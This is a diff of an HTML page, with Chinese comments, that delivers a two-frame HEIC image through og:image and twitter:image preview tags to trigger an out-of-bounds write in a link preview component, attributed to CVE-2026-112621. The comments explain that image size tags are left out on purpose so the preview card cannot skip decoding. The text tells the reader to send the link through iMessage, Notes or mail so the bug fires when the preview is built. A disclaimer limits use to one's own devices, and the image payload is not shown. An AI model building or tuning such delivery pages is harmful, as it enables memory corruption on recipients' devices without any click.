@@ -2,23 +2,31 @@
 <html lang="zh">
 <head>
   <meta charset="utf-8">
-  <title>Cinder27 · LinkPresentation 探测</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Cinder27 LinkPresentation probe</title>
+
   <!-- CVE-2026-112621 的组件是 LinkPresentation，不是 ImageIO。
-       预览卡片会抓 og:image 并把它画进固定尺寸的卡片里——
-       这才是「帧0 定几何、帧1 越界写」该生效的那条路。 -->
+       预览卡片会抓 og:image，把它解码并画进固定尺寸的卡片——
+       那才是「帧0 定几何、帧1 越界写」应当生效的路径。
+
+       刻意不声明 og:image:width / height：卡片在拿到尺寸后可能判定
+       「这张图不适合展示」而直接跳过，那样连解码都不会发生。 -->
   <meta property="og:type" content="website">
+  <meta property="og:site_name" content="Cinder27">
   <meta property="og:title" content="Cinder27 LinkPresentation probe">
   <meta property="og:description" content="两帧 HEIC：帧0 256x16，帧1 256x48。仅用于自有设备验证。">
   <meta property="og:image" content="heic_two_frames.heic">
+  <meta property="og:image:secure_url" content="heic_two_frames.heic">
   <meta property="og:image:type" content="image/heic">
-  <meta property="og:image:width" content="256">
-  <meta property="og:image:height" content="48">
+  <meta property="og:url" content="https://jixui666.github.io/testasdsf/">
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:image" content="heic_two_frames.heic">
+  <link rel="icon" href="data:,">
 </head>
 <body>
-<p>Cinder27 · LinkPresentation probe</p>
-<p>把本页链接发给自己的 iMessage / 备忘录 / 微信，观察预览是否正常生成。</p>
-<p>直接把本页在 Safari 打开不会触发 —— og:image 只被「生成预览卡片」的路径解析。</p>
+<h1>Cinder27 · LinkPresentation probe</h1>
+<p>把本页链接发给自己的 iMessage / 备忘录 / 邮件，观察预览卡片是否正常生成。</p>
+<p>直接在 Safari 打开本页不会触发 —— og:image 只被「生成预览卡片」的路径解析。</p>
+<p><img src="heic_two_frames.heic" alt="two-frame HEIC" width="256" height="48"></p>
 </body>
 </html>
